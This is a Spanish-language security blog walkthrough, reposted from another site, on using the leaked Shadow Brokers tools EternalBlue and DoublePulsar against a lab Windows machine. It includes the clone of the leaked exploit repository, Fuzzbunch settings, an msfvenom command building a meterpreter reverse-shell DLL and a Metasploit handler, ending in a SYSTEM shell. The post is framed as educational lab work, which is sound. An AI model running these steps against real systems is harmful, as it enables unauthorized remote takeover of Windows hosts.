# Explotando Eternalblue + Doublepulsar by Shadow Brokers

[FUENTE ORIGINAL](https://www.securityartwork.es/2017/04/21/shadow-brokers-explotando-eternalblue-doublepulsar/)

Hace no mucho tiempo Shadow Brokers había liberado una nueva hornada de exploits de la NSA. Por si esto fuera poco, en el github donde están los exploits también hay información sobre como atacar a los sistemas bancarios.

La gran mayoría de los exploits publicados hacen que comprometer un sistema Windows sea cosa de niños y casi como vemos en las películas, puesto que ente ellos se encuentran varios 0-day (ahora ya parcheados por Microsoft) que atacan al protocolo SMB en todas sus versiones.

De todos los exploits disponibles, el que más ha llamado la atención a la comunidad ha sido el combo del llamado Eternalblue + Doublepulsar. En este post vamos a explicar cómo desplegar un entorno de pruebas donde poder probar los exploits.

(N.d.E.: Sobra decir que la información se proporciona a título informativo y didáctico, con objeto de colaborar a mejorar el conocimiento de los técnicos en ciberseguridad. Los cibercriminales no necesitan que nadie les enseñe cómo utilizar los exploits, y a aquellos incautos scriptkiddies a los que se les ocurra jugar a ciberdelincuentes, en fin, mucha suerte en los juzgados).

Necesitaremos:

- Máquina Virtual Windows atacante.
- Maquina Vitrual Windows víctima.
- Equipo con Linux.

Una vez desplegadas las máquinas virtuales de Windows, el primer paso es preparar una de ellas como la atacante. En esta debemos satisfacer una serie de requisitos para poder utilizar el framework Fuzzbunch, que es desde donde lanzaremos los exploits. Para ello se debe descargar el repositorio del git donde se han publicado los exploits y herramientas.

      $ git clone  https://github.com/x0rz/EQGRP_Lost_in_Translation


Una vez clonado el repositorio en nuestro equipo, habrá que acceder al directorio Windows que está dentro de EQGRP_Lost_in_Translation y crear la carpeta listeningposts. Si no hacemos esto, al intentar ejecutar Fuzzbunch nos saltará un error avisando de que no encuentra el directorio.

Para poder ejecutar el framework correctamente y sin ningún error se necesita de una versión antigua de Python y de Pywin32:

- Python 2.6.6 de 32bits (se ha probado con Python 2.7 y no funciona).
- PyWin32-221 para Python 2.6.6.
- Jre-6u15-windows-i-586.

Una vez esté todo instalado vamos a pasar a la acción. Aquí utilizaremos powershell pero también se puede hacer mediante cmd.

## Uso del Framework Fuzzbunch

Desde el directorio EQGRP_Lost_in_Translation/windows ejecutamos Python fb.py para acceder al framework, e introducimos los siguientes parámetros:

- Default Default target IP Addres [] : IP de la víctima.
- Dafault Callback Addres [] : IP de nuestra máquina Windows.
- Use redirection[yes] : Establecer a ‘no’.
- Base Log directory [D:\logs] : Establecer la ruta para almacenar los logs.

Acto seguido hay que crear un proyecto. Una vez realizados estos pasos, veremos en el prompt fb

<p align="center">
<img src="../images/prompt_1.png"" title="Ilustración 1 Terminal del framework" ><div align="center">Ilustración 1 Terminal del framework.</div>

</p>

Para visualizar qué exploits hay disponibles podemos teclear **Show Exploits**:

<p align="center">

<img src="../images/prompt_2.png"" title="Ilustración 2 Exploits disponibles" >
<div align="center">Ilustración 2 Exploits disponibles.</div>

</p>

Como se ha comentado anteriormente, en este post se va a explicar Eternalblue (auque no salga en la lista, está disponible) junto con Doublepulsar. Muy por encima, Eternalblue se encarga de crear un backdoor y Doublepulsar inyecta una dll en el proceso del sistema que queramos.

## Eternalblue

Para hacer uso de Eternalblue hay que teclear use Eternalblue y acto seguido introducir la información solicitada por pantalla:

<p align="center">

<img src="../images/prompt_3.jpg" title="Ilustración 3 Configurando Eternalblue" >
<div align="center">Ilustración 3 Configurando Eternalblue.</div>

</p>

Si todo ha salido bien veremos el siguiente mensaje en el terminal:

<p align="center">

<img src="../images/prompt_4.png" title="Ilustración 4 Ejecución terminada con éxito" >
<div align="center">Ilustración 4 Ejecución terminada con éxito.</div>

</p>

## Doublepulsar

Con la backdor creada con Eternalblue, el próximo paso a realizar es inyectar una dll en un proceso del sistema comprometido haciendo uso de Doublepulsar.

Para generar la dll podemos hacer uso de msfvenom:

    $ msfvenom -a x64 -p windows/meterpreter/reverse_tcp lhost=IP lport=PUERTO -f dll -o raccoon64V2.dll

Y desde metasploit dejar un handler esperando a recibir una conexión desde la máquina comprometida:

    use exploit/multi/handler
    set payload windows/x64/meterpreter/reverse_tcp
    [..]

Volviendo a Doublepulsar, como en el proceso anterior hay que introducir la información que va apareciendo en el terminal:

<p align="center">

<img src="../images/prompt_5.png" title="Ilustración 5 Configuración Doublepulsar" >
<div align="center">Ilustración 5 Configuración Doublepulsar.</div>

</p>

Si lo hemos hecho todo bien, tendremos en nuestro equipo local un meterpreter con privilegios SYSTEM sobre la máquina virtual víctima. **Con unos sencillos pasos y un par de clicks hemos llegado a comprometer un equipo conociendo solo su dirección IP**.

<p align="center">

<img src="../images/prompt_6.jpg" title="Ilustración 6 Sesión de meterpreter" >
<div align="center">Ilustración 6 Sesión de meterpreter.</div>

</p>

Por último y no menos importante, una vez tengamos la conexión con el meterpreter deberemos volver a ejecutar Doublepulsar y seleccionar la opción:

    4) Uninstall           Remove's backdoor from system

Para eliminar la backdoor, puesto que ya no la necesitamos.

<p align="center">

<img src="../images/prompt_7.png" title="Ilustración 7 Eliminación de la backdoor" >
<div align="center">Ilustración 7 Eliminación de la backdoor </div>

</p>

Como se ha podido observar, resulta alarmante la facilidad con la que se consigue comprometer un sistema Windows haciendo uso de estos exploits.

En estos momentos creo que todo el mundo se estará preguntando: ¿si esto es lo que se ha publicado, que más cosas tendrán los chicos buenos de la NSA?

Agradecimientos a la pagina https://www.securityartwork.es/2017/04/21/shadow-brokers-explotando-eternalblue-doublepulsar/ por la traduccion del paper: https://www.exploit-db.com/docs/41896.pdf
